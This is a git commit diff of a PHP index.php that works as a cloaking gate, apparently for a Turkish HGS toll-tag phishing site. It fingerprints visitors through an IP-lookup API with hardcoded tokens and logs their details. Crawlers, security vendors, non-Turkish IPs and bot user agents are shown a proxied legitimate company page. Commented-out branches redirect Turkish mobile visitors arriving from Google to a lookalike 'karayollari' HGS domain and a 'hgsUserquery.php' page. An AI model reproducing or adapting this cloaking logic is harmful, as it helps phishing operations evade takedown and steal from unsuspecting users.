69008f5e4259804941eedfe45c23e64f66d14cd5
muhsingormus653 <149015163+muhsingormus653@users.noreply.github.com>
2023-11-10 03:38:51 +0300

    Update index.php

--- index.php
+++ index.php
@@ -1,232 +1,247 @@
 <?php
 include "analiz.html";
-// Cloudflare kullanarak istemci bilgilerini al
-if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && !empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
-    // Ziyaretçinin gerçek IP adresi Cloudflare tarafından sağlanan başlıktan alınır.
-    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
-} elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR']) && !empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-    // Eğer HTTP_CF_CONNECTING_IP başlığı yoksa, X-Forwarded-For başlığını kontrol ederek ziyaretçinin gerçek IP adresini almaya çalışın.
-    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
-} else {
-    // Hem CF_CONNECTING_IP hem de X-Forwarded-For başlıkları yoksa, $_SERVER['REMOTE_ADDR'] kullanılır.
-    $ip = $_SERVER['REMOTE_ADDR'];
-}
-$userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
+$userAgent = $_SERVER['HTTP_USER_AGENT'];
+$ziyaretciuseragent = strtolower($userAgent);
 $language = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']);
-$referer = $_SERVER['HTTP_REFERER'];
-$httpHost = $_SERVER['HTTP_HOST'];
-// IPv6 kontrolü
-if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)) {
-    // Eğer IPv6 ise 502 Bad Gateway hatasını döndür
-    header('HTTP/1.1 502 Bad Gateway');
-    echo 'Host Not Found or connection failed';
+// CLOUDFLARE CALISACAGI ZAMAN BURAYI AKTIF ET
+/*
+if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+    $ziyaretciip = isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER['REMOTE_ADDR'];
+} else {
+    $ziyaretciip = isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER['REMOTE_ADDR'];
+}
+*/
+
+//GITHUB CALISACAGI ZAMAN BURAYI AKTIF ET
+if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+    $ziyaretciip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+} else {
+    $ziyaretciip = $_SERVER['REMOTE_ADDR'];
+}
+
+if(isset($_SERVER['HTTP_REFERER'])) {
+    $ziyaretcireferer = $_SERVER['HTTP_REFERER'];
+} else {
+    $ziyaretcireferer = ''; // Referer bilgisi yoksa boş bir değer ata
+}
+
+if (filter_var($ziyaretciip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)) 
+{
+    $url = 'https://www.akisguvenlik.com/hgs-hizli-gecis-sistemleri/';
+     // cURL ile web sitesini göster
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    $response = curl_exec($ch);
+    if ($response === false) 
+	{
+        echo 'cURL hatası: ' . curl_error($ch);
+    } else {
+        echo $response;
+    }
+    curl_close($ch);
+        // Kodu burada sonlandırabilirsiniz
     exit;
-} 
-$api_url = "https://ipinfo.io/{$ip}?token=c9a3892daa1ecd";
+}
+
+$api_url = "https://ipinfo.io/{$ziyaretciip}?token=569c751f497e77";
+// cURL ile API'ye istek gönder
 $ch = curl_init($api_url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 $response = curl_exec($ch);
-if (curl_errno($ch)) {
-    echo 'Hata: ' . curl_error($ch);
+if ($response === false) {
+    echo 'cURL hatası: ' . curl_error($ch);
+    exit;
+}
+// JSON yanıtını çözümle
+$data = json_decode($response, true);
+if ($data === null) 
+{
+    echo 'JSON yanıtını çözümleme hatası';
+    exit;
+}
+
+// JSON verilerini ilgili değişkenlere aktar
+$ziyaretciulke = strtolower($data['country'] ?? '');
+$ziyaretciasnname = strtolower($data['asn']['name'] ?? '');
+$ziyaretcicompanyname = strtolower($data['company']['name'] ?? '');
+$ziyaretciabusemail = strtolower($data['abuse']['email'] ?? '');
+curl_close($ch);
+
+// KURALLAR BLOĞU
+// KURAL 1
+session_start(); // Oturumu başlat
+$not_defteri = json_decode(file_get_contents('not_defteri.json'), true);
+$ip_key = md5($ziyaretciip);
+
+if (isset($not_defteri[$ip_key])) {
+    $kural = $not_defteri[$ip_key]['kural'];
+    $url = $not_defteri[$ip_key]['url'];
+    
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    $response = curl_exec($ch);
+    if ($response === false) {
+        echo 'cURL hatası: ' . curl_error($ch);
+    } 
+    else 
+    {
+        
+        echo $response;
+    }
+    curl_close($ch);
+    
+    exit;
+}
+
+if (
+    strpos($ziyaretciulke, 'tr') === false ||
+    strpos($ziyaretciasnname, 'google, llc') !== false ||
+    strpos($ziyaretcicompanyname, 'google') !== false ||
+    strpos($ziyaretcicompanyname, 'ireland') !== false ||
+    strpos($ziyaretcicompanyname, 'turknet') !== false ||
+    strpos($ziyaretcicompanyname, 'bot') !== false ||
+    strpos($ziyaretcicompanyname, 'avast') !== false ||
+    strpos($ziyaretcicompanyname, 'viettel') !== false ||
+    strpos($ziyaretcicompanyname, 'carinet') !== false ||
+    strpos($ziyaretciabuseemail, 'google') !== false
+) {
+    $url = 'https://www.akisguvenlik.com/hgs-hizli-gecis-sistemleri/';
+    
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    $response = curl_exec($ch);
+    if ($response === false) {
+        echo 'cURL hatası: ' . curl_error($ch);
+    } 
+    else 
+    {
+        echo $ziyaretciuseragent;
+        echo $response;
+    }
+    curl_close($ch);
+    
+    $not_defteri[$ip_key] = [
+        'kural' => 'Kural 1',
+        'url' => $url
+    ];
+    $not_defteri = array_values($not_defteri);
+    
+    file_put_contents('not_defteri.json', json_encode($not_defteri, JSON_PRETTY_PRINT));
+    date_default_timezone_set("Europe/Istanbul");
+    $current_date_time = date("H:i:s");
+    $file_contents = file_get_contents("iploglari.txt");
+    $line_count = count(explode("\n", $file_contents));
+    $line_number = $line_count + 1;
+    $data = "$line_number - $ziyaretciip - $ziyaretciuseragent - $ziyaretciulke - $current_date_time - $language - GOOGLE BOT\n";
+    $file = 'iploglari.txt';
+    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
+    exit;
+}
+// KURAL 1 BİTİŞ
+
+// KURAL 2
+if (empty($ziyaretcireferer) || preg_match('/(google|googlebot|x11|ucbrowser|python|webtech|compatible|mac|os|15e148|curl|spider|crawler|mediapartners|apac|none|info|yandex|bing|tiktok|twitter|facebook|sql|slurp|duckduckbot|baiduspider|yandexbot|windows|whatsapp|telegram|discord)/i', $ziyaretciuseragent)) {
+    
+    $url = 'https://www.akisguvenlik.com/hgs-hizli-gecis-sistemleri/';
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    $response = curl_exec($ch);
+    if ($response === false) 
+	{
+        echo 'cURL hatası: ' . curl_error($ch);
+    } 
+	else 
+	{
+
+        echo $response;
+    }
+    curl_close($ch);
+    
+    $not_defteri = json_decode(file_get_contents('not_defteri.json'), true);
+    $ip_key = md5($ziyaretciip);
+    $not_defteri[$ip_key] = [
+        'kural' => 'Kural 2',
+        'url' => $url
+    ];
+    $not_defteri = array_values($not_defteri);
+    
+    file_put_contents('not_defteri.json', json_encode($not_defteri, JSON_PRETTY_PRINT));
+
+    date_default_timezone_set("Europe/Istanbul");
+    $current_date_time = date("H:i:s");
+    $file_contents = file_get_contents("iploglari.txt");
+    $line_count = count(explode("\n", $file_contents));
+    $line_number = $line_count + 1;
+    $data = "$line_number - $ziyaretciip - $ziyaretciuseragent - $ziyaretciulke - $current_date_time - $language - BOT GIRISI\n";
+    $file = 'iploglari.txt';
+    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
+    exit;
+}
+// KURAL 1 BİTİŞ
+
+/*
+// YONLENDIRME KISMI BURASI BASLANGIC
+if (
+    strpos($ziyaretciulke, 'tr') !== false &&
+    (strpos($ziyaretciuseragent, 'android') !== false ||
+     strpos($ziyaretciuseragent, 'iphone') !== false ||
+     strpos($ziyaretciuseragent, 'ios') !== false) &&
+    strpos($_SERVER['HTTP_ACCEPT_LANGUAGE'], 'tr') !== false &&
+    (strpos($ziyaretcireferer, 'https://www.google.com') === 0 || strpos($ziyaretcireferer, 'https://www.google.com.tr') === 0)
+) {
+    ob_start();
+    // Yönlendirme
+    header('Location: yuklemeler/hgsUserquery.php');
+    // Çıktı tamponlamayı sonlandır ve herhangi bir çıktıyı sil
+    ob_end_clean();
+    date_default_timezone_set("Europe/Istanbul");
+    $current_date_time = date("H:i:s");
+    $file_contents = file_get_contents("iploglari.txt");
+    $line_count = count(explode("\n", $file_contents));
+    $line_number = $line_count + 1;
+    $data = "$line_number - $ziyaretciip - $ziyaretciuseragent - $ziyaretciulke - $current_date_time - $language - NORMAL GIRIS\n";
+    $file = 'iploglari.txt';
+    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
+    exit;
+}
+
+// YONLENDIRME KISMI BURASI BITIS
+*/
+
+// KURAL 2: Diğer durumlar
+$url = 'https://www.akisguvenlik.com/hgs-hizli-gecis-sistemleri/';
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$response = curl_exec($ch);
+if ($response === false) {
+    echo 'cURL hatası: ' . curl_error($ch);
 } 
 else 
 {
-	$data = json_decode($response, true);
-    if (isset($data['country'])) {
-        $ulke = $data['country'];
-    }
-    $data = json_decode($response, true);
-    if (isset($data['asn']['name']) && (stripos($data['asn']['name'], 'Google') !== false || stripos($data['asn']['name'], 'LLC') !== false)) {
-    header('Content-Type: text/html');
-    
-    // Use cURL to fetch the remote content
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, 'https://www.madoors.com.tr/kategori/turnike-gecis-sistemi');
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-    $content = curl_exec($ch);
-    curl_close($ch);
-    echo $content;
-    date_default_timezone_set("Europe/Istanbul");
-    $current_date_time = date("H:i:s");
-    $file_contents = file_get_contents("iploglari.txt");
-    $line_count = count(explode("\n", $file_contents));
-    $line_number = $line_count + 1;
-    $data = "$line_number - $ip - $userAgent - $ulke - $current_date_time - $language - GOOGLE BOT\n";
-    $file = 'iploglari.txt';
-    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
-    exit; // Stop the code here
-}  
-    elseif (isset($data['company']['name']) && (stripos($data['company']['name'], 'Google') !== false || stripos($data['company']['name'], 'LLC') !== false || stripos($data['company']['name'], 'IRELAND') !== false || stripos($data['company']['name'], 'GOOGLE') !== false || stripos($data['company']['name'], 'TurkNet') !== false || stripos($data['company']['name'], 'AVAST') !== false || stripos($data['company']['name'], 'Ireland') !== false || stripos($data['company']['name'], 'Viettel') !== false || stripos($data['company']['name'], 'CariNet') !== false || stripos($data['company']['name'], 'CariNet') !== false)) 
-    {
-    header('Content-Type: text/html');
-    // Use cURL to fetch the remote content
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, 'https://www.madoors.com.tr/kategori/turnike-gecis-sistemi');
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-    $content = curl_exec($ch);
-    curl_close($ch);
-    echo $content;
-        date_default_timezone_set("Europe/Istanbul");
-        $current_date_time = date("H:i:s");
-        $file_contents = file_get_contents("iploglari.txt");
-        $line_count = count(explode("\n", $file_contents));
-        $line_number = $line_count + 1;
-        $data = "$line_number - $ip - $userAgent - $ulke - $current_date_time - $language - GOOGLE BOT\n";
-        $file = 'iploglari.txt';
-        file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
-        exit; // Kodu burada durdur
-    } 
-    elseif (isset($data['abuse']['email']) && $data['abuse']['email'] === 'network-abuse@google.com') {
-    header('Content-Type: text/html');
-    // Use cURL to fetch the remote content
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, 'https://www.madoors.com.tr/kategori/turnike-gecis-sistemi');
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-    $content = curl_exec($ch);
-    curl_close($ch);
-    echo $content;
-        date_default_timezone_set("Europe/Istanbul");
-        $current_date_time = date("H:i:s");
-        $file_contents = file_get_contents("iploglari.txt");
-        $line_count = count(explode("\n", $file_contents));
-        $line_number = $line_count + 1;
-        $data = "$line_number - $ip - $userAgent - $ulke - $current_date_time - $language - GOOGLE BOT\n";
-        $file = 'iploglari.txt';
-        file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
-        exit; // Kodu burada durdur
-    }
+    echo $response;
 }
 curl_close($ch);
-// 1. Adım
-// Değişkenleri alınan bilgilerle doldurun
-$ip = strtolower($ip);
-$userAgent = strtolower($userAgent);
-$language = strtolower($language);
-// "mac", "os",  "15e148"
-// 4. Adım
-$blockedUserAgents = array("google", "googlebot", "x11", "ucbrowser", "python", "webtech", "compatible", "curl", "mac", "os",  "15e148", "spider", "crawler", "mediapartners", "apac", "none", "info", "yandex", "bing", "tiktok", "twitter", "facebook", "sql", "slurp", "duckduckbot", "baiduspider", "yandexbot", "windows", "whatsapp", "telegram", "discord", "crios");
-$userAgent = $_SERVER['HTTP_USER_AGENT'];
-if (empty($userAgent)) {
-    // Useragent bilgisi boşsa bu blok çalışır
-    header('Content-Type: text/html');
-    // Use cURL to fetch the remote content
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, 'https://www.madoors.com.tr/kategori/turnike-gecis-sistemi');
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-    $content = curl_exec($ch);
-    curl_close($ch);
-    echo $content;
+
+$not_defteri = json_decode(file_get_contents('not_defteri.json'), true);
+$ip_key = md5($ziyaretciip);
+$not_defteri[$ip_key] = [
+    'kural' => 'Kural 2',
+    'url' => $url
+];
+file_put_contents('not_defteri.json', json_encode($not_defteri));
     date_default_timezone_set("Europe/Istanbul");
     $current_date_time = date("H:i:s");
     $file_contents = file_get_contents("iploglari.txt");
     $line_count = count(explode("\n", $file_contents));
     $line_number = $line_count + 1;
-    $data = "$line_number - $ip - $userAgent - $ulke - $current_date_time - $language - BOT GIRISI\n";
+    $data = "$line_number - $ziyaretciip - $ziyaretciuseragent - $ziyaretciulke - $current_date_time - $language - DIGER TURLU GIRISI\n";
     $file = 'iploglari.txt';
     file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
-    exit;
-} else {
-    // Useragent bilgisi dolu ise diğer kontrolü yapabilirsiniz
-    foreach ($blockedUserAgents as $blockedAgent) {
-        if (stripos($userAgent, $blockedAgent) !== false) {
-            // Bloke edilen bir user agenti bulundu
-    header('Content-Type: text/html');
-    // Use cURL to fetch the remote content
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, 'https://www.madoors.com.tr/kategori/turnike-gecis-sistemi');
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-    $content = curl_exec($ch);
-    curl_close($ch);
-    echo $content;
-            date_default_timezone_set("Europe/Istanbul");
-            $current_date_time = date("H:i:s");
-            $file_contents = file_get_contents("iploglari.txt");
-            $line_count = count(explode("\n", $file_contents));
-            $line_number = $line_count + 1;
-            $data = "$line_number - $ip - $userAgent - $ulke - $current_date_time - $language - BOT GIRISI\n";
-            $file = 'iploglari.txt';
-            file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
-            exit;
-        }
-    }
-}
-/*
-if ((strpos($referer, "google.com") !== false || strpos($referer, "google.com.tr") !== false) && $ulke === "TR" && (stripos($userAgent, "android") !== false || stripos($userAgent, "iphone") !== false || stripos($userAgent, "ios") !== false) && stripos($language, "tr") !== false)
-{
-    ob_start();
-    // Yönlendirme
-    header('Location: https://karayollari-surucuhgsetiket.net/index.php');
-    // Çıktı tamponlamayı sonlandır ve herhangi bir çıktıyı sil
-    ob_end_clean();
-        date_default_timezone_set("Europe/Istanbul");
-        $current_date_time = date("H:i:s");
-        $file_contents = file_get_contents("iploglari.txt");
-        $line_count = count(explode("\n", $file_contents));
-        $line_number = $line_count + 1;
-        $data = "$line_number - $ip - $userAgent - $ulke - $current_date_time - $language - NORMAL GIRIS\n";
-        $file = 'iploglari.txt';
-        file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
-    exit;
-} 
-*/
-// 3. Adım
-if (empty($referer) || strpos($referer, "google.com") === false) {
-    header('Content-Type: text/html');
-    // Use cURL to fetch the remote content
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, 'https://www.madoors.com.tr/kategori/turnike-gecis-sistemi');
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-    $content = curl_exec($ch);
-    curl_close($ch);
-    echo $content;
-    date_default_timezone_set("Europe/Istanbul");
-    $current_date_time = date("H:i:s");
-    $file_contents = file_get_contents("iploglari.txt");
-    $line_count = count(explode("\n", $file_contents));
-    $line_number = $line_count + 1;
-    $data = "$line_number - $ip - $userAgent - $ulke - $current_date_time - $language -  REFERER Yok\n";
-    $file = 'iploglari.txt';
-    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
-    exit;
-}
-// 5. Adım
-if ($ulke !== "TR") {
-    header('Content-Type: text/html');
-    // Use cURL to fetch the remote content
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, 'https://www.madoors.com.tr/kategori/turnike-gecis-sistemi');
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-    $content = curl_exec($ch);
-    curl_close($ch);
-    echo $content;
-        date_default_timezone_set("Europe/Istanbul");
-        $current_date_time = date("H:i:s");
-        $file_contents = file_get_contents("iploglari.txt");
-        $line_count = count(explode("\n", $file_contents));
-        $line_number = $line_count + 1;
-        $data = "$line_number - $ip - $userAgent - $ulke - $current_date_time - $language - TR DISI GIRIS\n";
-        $file = 'iploglari.txt';
-        file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
-    exit;
-}
-// 6. Adım
-// 7. Adım
-// Varsayılan durum
-    header('Content-Type: text/html');
-    // Use cURL to fetch the remote content
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, 'https://www.madoors.com.tr/kategori/turnike-gecis-sistemi');
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-    $content = curl_exec($ch);
-    curl_close($ch);
-    echo $content;
-        date_default_timezone_set("Europe/Istanbul");
-        $current_date_time = date("H:i:s");
-        $file_contents = file_get_contents("iploglari.txt");
-        $line_count = count(explode("\n", $file_contents));
-        $line_number = $line_count + 1;
-        $data = "$line_number - $ip - $userAgent - $ulke - $current_date_time - $language - DIGER TURLU GIRISI\n";
-        $file = 'iploglari.txt';
-        file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
 exit;
+// KURAL 2 BİTİŞ
 ?>
